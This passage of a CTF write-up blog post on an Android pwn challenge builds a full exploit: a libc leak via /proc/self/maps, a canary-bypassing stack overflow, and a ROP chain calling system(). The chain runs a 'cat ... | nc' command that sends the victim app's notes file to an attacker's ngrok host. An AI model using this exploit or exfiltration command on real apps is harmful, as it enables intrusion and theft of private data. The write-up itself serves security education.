+</span></span><span style=display:flex><span>    FILE <span style=color:#f92672>*</span>fp <span style=color:#f92672>=</span> fopen(<span style=color:#e6db74>&#34;/proc/self/maps&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (fp <span style=color:#f92672>==</span> NULL) {
+</span></span><span style=display:flex><span>        ALOGE(<span style=color:#e6db74>&#34;failed to open /proc/self/maps&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> NULL;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> (getline(<span style=color:#f92672>&amp;</span>line, <span style=color:#f92672>&amp;</span>line_len, fp) <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//trim line endings
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span>(line_len <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>            line_len <span style=color:#f92672>=</span> strlen(line);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(line_len <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> line[line_len<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;\n&#39;</span>)
+</span></span><span style=display:flex><span>            line[<span style=color:#f92672>--</span>line_len] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(ends_with(line, <span style=color:#e6db74>&#34;/libc.so&#34;</span>)) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>addr_start, <span style=color:#f92672>*</span>addr_end;
+</span></span><span style=display:flex><span>            sscanf(line, <span style=color:#e6db74>&#34;%p-%p&#34;</span>, <span style=color:#f92672>&amp;</span>addr_start, <span style=color:#f92672>&amp;</span>addr_end);
+</span></span><span style=display:flex><span>            libc_base <span style=color:#f92672>=</span> <span style=color:#66d9ef>reinterpret_cast</span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>uint64_t</span><span style=color:#f92672>&gt;</span>(addr_start);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    fclose(fp);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(line)
+</span></span><span style=display:flex><span>        free(line);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> libc_base;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Let&rsquo;s try out our payload so far:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>// cpp/main.cpp
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>template</span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> T<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> write_buf(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>buf, size_t <span style=color:#f92672>*</span>len, T val) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>cptr <span style=color:#f92672>=</span> <span style=color:#66d9ef>reinterpret_cast</span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*&gt;</span>(buf);
+</span></span><span style=display:flex><span>    memcpy(cptr<span style=color:#f92672>+*</span>len, <span style=color:#f92672>&amp;</span>val, <span style=color:#66d9ef>sizeof</span>(val));
+</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>len <span style=color:#f92672>+=</span> <span style=color:#66d9ef>sizeof</span>(val);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#75715e>#define write_u8(buf, len, val) write_buf((buf), (len), (uint8_t)(val))
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define write_u64(buf, len, val) write_buf((buf), (len), (uint64_t)(val))
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>extern</span> <span style=color:#e6db74>&#34;C&#34;</span>
+</span></span><span style=display:flex><span>JNIEXPORT jbyteArray JNICALL
+</span></span><span style=display:flex><span>Java_com_example_insomnipwn_MainActivity_buildPayload(JNIEnv <span style=color:#f92672>*</span>env, jobject thiz) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint64_t</span> canary <span style=color:#f92672>=</span> canaryLeaker();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint64_t</span> libc_base <span style=color:#f92672>=</span> libcLeaker();
+</span></span><span style=display:flex><span>    ALOGI(<span style=color:#e6db74>&#34;canary= 0x%llx&#34;</span>, canary);
+</span></span><span style=display:flex><span>    ALOGI(<span style=color:#e6db74>&#34;libc base= 0x%llx&#34;</span>, libc_base);
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>payload <span style=color:#f92672>=</span> <span style=color:#66d9ef>static_cast</span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*&gt;</span>(calloc(<span style=color:#ae81ff>0x1000</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>)));
+</span></span><span style=display:flex><span>    size_t payload_len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>56</span>; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>        write_u8(payload, <span style=color:#f92672>&amp;</span>payload_len, <span style=color:#ae81ff>0x41</span>); <span style=color:#75715e>//padding
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    }
+</span></span><span style=display:flex><span>    write_u64(payload, <span style=color:#f92672>&amp;</span>payload_len, canary);
+</span></span><span style=display:flex><span>    write_u64(payload, <span style=color:#f92672>&amp;</span>payload_len, <span style=color:#ae81ff>0x4242424242424242</span>); <span style=color:#75715e>//rbp
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    write_u64(payload, <span style=color:#f92672>&amp;</span>payload_len, <span style=color:#ae81ff>0x4343434343434343</span>); <span style=color:#75715e>//pc
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>    jbyteArray res <span style=color:#f92672>=</span> env<span style=color:#f92672>-&gt;</span>NewByteArray(payload_len);
+</span></span><span style=display:flex><span>    env<span style=color:#f92672>-&gt;</span>SetByteArrayRegion(res, <span style=color:#ae81ff>0</span>, payload_len, <span style=color:#66d9ef>reinterpret_cast</span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>const</span> jbyte <span style=color:#f92672>*&gt;</span>(payload));
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> res;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><img src=/post-resources/cryptonotes/pc-control.png alt=pc-control></p><p>Perfect! The crash that we get is a <code>SIGSEGV</code> at <code>0x4343434343434343</code> and there is no <code>stack corruption detected (-fstack-protector)</code> message shown this time. This means that we successfully bypassed the canary. Here are also the logs from our malicious app:</p><p><img src=/post-resources/cryptonotes/malicious-app-logs.png alt=malicious-app-logs></p><h3 id=exfiltrating-data>Exfiltrating data</h3><p>We have control of <code>pc</code> and now we need to read the SharedPreference file <code>/data/user/0/com.inso.ins24/shared_prefs/com.inso.ins24.mynotes.xml</code>. The victim application has no way to pass back data to our malicious application via the Intent that we sent it. However, the victim application has <code>android.permission.INTERNET</code>. So we will send the SharedPrefernce file over newtork to our host machine.</p><p><em>Note: Even if the victim application did not have <code>android.permission.INTERNET</code>, we could still copy the SharedPreference file in external storage (e.g. in <code>/sdcard/Download</code>). Afterwards, our malicious application could read it and then use its own <code>android.permission.INTERNET</code> permission to send/leak it from the remote machine to a server that we control.</em></p><p>To avoid the hassle with NATs, we will use <a href=https://ngrok.com/ target=_blank rel="noopener noreferrer">ngrok</a>. So, we spawn one terminal with <code>ngrok tcp 5000</code> and another with <code>nc -lnvp 5000</code>. We will execute the below command in the context of the victim application via a ROP chain:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat /data/user/0/com.inso.ins24/shared_prefs/com.inso.ins24.mynotes.xml | <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    nc &lt;ngrok pub ip&gt; &lt;ngrok pub port&gt;
+</span></span></code></pre></div><h3 id=building-a-rop-chain>Building a ROP chain</h3><p>We have control of <code>pc</code> and a libc leak. So, it is now just a matter of finding the correct gadgets to invoke <code>system(cmd)</code>. When we are at <code>get_algo+0xa9: pc=ret;</code>, this is how the registers look like:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>$rax</span>   : <span style=color:#ae81ff>0x000077031bb80a10</span>  <span style=color:#960050;background-color:#1e0010>→</span>  <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#66d9ef>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>[...]<span style=color:#960050;background-color:#1e0010>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>$rsi</span>   : <span style=color:#ae81ff>0x000077031bb80910</span>  <span style=color:#960050;background-color:#1e0010>→</span>  <span style=color:#ae81ff>0x00007704f8927f00</span>  <span style=color:#960050;background-color:#1e0010>→</span>  <span style=color:#ae81ff>0x00000000005c0000</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>$rdi</span>   : <span style=color:#ae81ff>0x000077031bb80900</span>  <span style=color:#960050;background-color:#1e0010>→</span>  <span style=color:#ae81ff>0x00007703005c0000</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>$r8</span>    : <span style=color:#ae81ff>0x000077031bb808f8</span>  <span style=color:#960050;background-color:#1e0010>→</span>  <span style=color:#ae81ff>0x00007703e8914460</span>  <span style=color:#960050;background-color:#1e0010>→</span>  <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#66d9ef>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>[...]<span style=color:#960050;background-color:#1e0010>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>$r9</span>    : <span style=color:#ae81ff>0x60</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>$r12</span>   : <span style=color:#ae81ff>0x000077031bb80d40</span>  <span style=color:#960050;background-color:#1e0010>→</span>  <span style=color:#ae81ff>0x000077031bb81090</span>  <span style=color:#960050;background-color:#1e0010>→</span>  <span style=color:#ae81ff>0x000077031bb812e0</span>  <span style=color:#960050;background-color:#1e0010>→</span>  <span style=color:#ae81ff>0x000077031bb81470</span>  <span style=color:#960050;background-color:#1e0010>→</span>  <span style=color:#ae81ff>0x000077031bb815f0</span>  <span style=color:#960050;background-color:#1e0010>→</span>  <span style=color:#ae81ff>0x000077031bb81810</span>  <span style=color:#960050;background-color:#1e0010>→</span>  <span style=color:#ae81ff>0x0000000000000000</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>$r14</span>   : <span style=color:#ae81ff>0x000077031bb80f90</span>  <span style=color:#960050;background-color:#1e0010>→</span>  <span style=color:#ae81ff>0x0000000000000000</span>
+</span></span></code></pre></div><p><code>$rax</code> points to our payload buffer (return value) on the stack. <code>$rdi</code> is also pointing in the stack. How convenient for <code>$rdi</code>! We will add some constants to <code>$rdi</code> so that we make it point to our <code>cmd</code> buffer in the stack and then invoke <code>system(cmd)</code>. Using <a href=https://github.com/sashs/Ropper target=_blank rel="noopener noreferrer">ropper</a> it was easy to find the gadget <code>add rdi, 0x90; mov rax, qword ptr [rdi]; pop rbx; ret;</code> in libc.</p><p>So, here is our final payload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>// cpp/main.cpp
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>uint64_t</span> gadget__add_rdi_0x90 <span style=color:#f92672>=</span> libc_base<span style=color:#f92672>+</span><span style=color:#ae81ff>0x00000000000cae06</span>; <span style=color:#75715e>// 0x00000000000cae06: add rdi, 0x90; mov rax, qword ptr [rdi]; pop rbx; ret;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>uint64_t</span> gadget__noop         <span style=color:#f92672>=</span> libc_base<span style=color:#f92672>+</span><span style=color:#ae81ff>0x000000000007a60a</span>; <span style=color:#75715e>// 0x000000000007a60a: ret;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>uint64_t</span> system__addr         <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x6f190</span>; <span style=color:#75715e>// system@@LIBC
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>payload <span style=color:#f92672>=</span> <span style=color:#66d9ef>static_cast</span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*&gt;</span>(calloc(<span style=color:#ae81ff>0x1000</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>)));
+</span></span><span style=display:flex><span>size_t payload_len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>56</span>; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>    write_u8(payload, <span style=color:#f92672>&amp;</span>payload_len, <span style=color:#ae81ff>0x41</span>); <span style=color:#75715e>//padding
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
+</span></span><span style=display:flex><span>write_u64(payload, <span style=color:#f92672>&amp;</span>payload_len, canary);
+</span></span><span style=display:flex><span>write_u64(payload, <span style=color:#f92672>&amp;</span>payload_len, <span style=color:#ae81ff>0x4242424242424242</span>); <span style=color:#75715e>//rbp
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>write_u64(payload, <span style=color:#f92672>&amp;</span>payload_len, gadget__add_rdi_0x90); <span style=color:#75715e>//pc
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>write_u64(payload, <span style=color:#f92672>&amp;</span>payload_len, <span style=color:#ae81ff>0x4141414141414141</span>); <span style=color:#75715e>//pop rbx
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>write_u64(payload, <span style=color:#f92672>&amp;</span>payload_len, gadget__add_rdi_0x90); <span style=color:#75715e>//pc
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>write_u64(payload, <span style=color:#f92672>&amp;</span>payload_len, <span style=color:#ae81ff>0x4141414141414141</span>); <span style=color:#75715e>//pop rbx
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>write_u64(payload, <span style=color:#f92672>&amp;</span>payload_len, gadget__add_rdi_0x90); <span style=color:#75715e>//pc
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>write_u64(payload, <span style=color:#f92672>&amp;</span>payload_len, <span style=color:#ae81ff>0x4141414141414141</span>); <span style=color:#75715e>//pop rbx
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>write_u64(payload, <span style=color:#f92672>&amp;</span>payload_len, gadget__noop); <span style=color:#75715e>//pc. stack-alignment fix for movaps
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>write_u64(payload, <span style=color:#f92672>&amp;</span>payload_len, system__addr); <span style=color:#75715e>//pc
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>ALOGI(<span style=color:#e6db74>&#34;Payload len until pop pc=system; 0x%zx&#34;</span>, payload_len);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span>(payload_len <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0xA0</span>) {
+</span></span><span style=display:flex><span>    write_u8(payload, <span style=color:#f92672>&amp;</span>payload_len, <span style=color:#ae81ff>0x41</span>); <span style=color:#75715e>//padding
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//terminal1: ngrok tcp 5000
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//terminal2: nc -lnvp 5000
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>ngrok_pub_addr <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;4.tcp.eu.ngrok.io&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>int</span> ngrok_pub_port <span style=color:#f92672>=</span> <span style=color:#ae81ff>14991</span>;
+</span></span><span style=display:flex><span>std<span style=color:#f92672>::</span>string cmd <span style=color:#f92672>=</span>
+</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>string(<span style=color:#e6db74>&#34;cat /data/user/0/com.inso.ins24/shared_prefs/com.inso.ins24.mynotes.xml | nc &#34;</span>) <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>string(ngrok_pub_addr) <span style=color:#f92672>+</span> std<span style=color:#f92672>::</span>string(<span style=color:#e6db74>&#34; &#34;</span>) <span style=color:#f92672>+</span> std<span style=color:#f92672>::</span>to_string(ngrok_pub_port);
+</span></span><span style=display:flex><span>ALOGI(<span style=color:#e6db74>&#34;Using command: %s&#34;</span>, cmd.c_str());
+</span></span><span style=display:flex><span>write_string(payload, <span style=color:#f92672>&amp;</span>payload_len, cmd.c_str());
+</span></span></code></pre></div><p>Finally, we run our application, send the malicious the Intent, and receive the flag in our ngrok callback!</p><p><img src=/post-resources/cryptonotes/flag.png alt=flag></p></div></article><hr><p class=articleTagsContainer><span> </span><strong>Tags:</strong>
+<a href=/tags/android>#Android</a>
+<a href=/tags/ctf>#ctf</a>
+<a href=/tags/insomnihack>#insomni'hack</a>
+<a href=/tags/pwn>#pwn</a></p></main><footer><hr><p><small>2024 &copy; Nikolaos Chalkiadakis</small></p><p><small><a href=https://gitlab.com/gabmus/hugo-ficurinia>Ficurinia theme</a> for <a href=https://gohugo.io>Hugo</a> by <a href=https://gabmus.org>Gabriele Musco</a>. Licensed under <a href=https://www.gnu.org/licenses/agpl-3.0.html>GNU AGPLv3</a>.</small></p></footer></div></div></div></body></html>
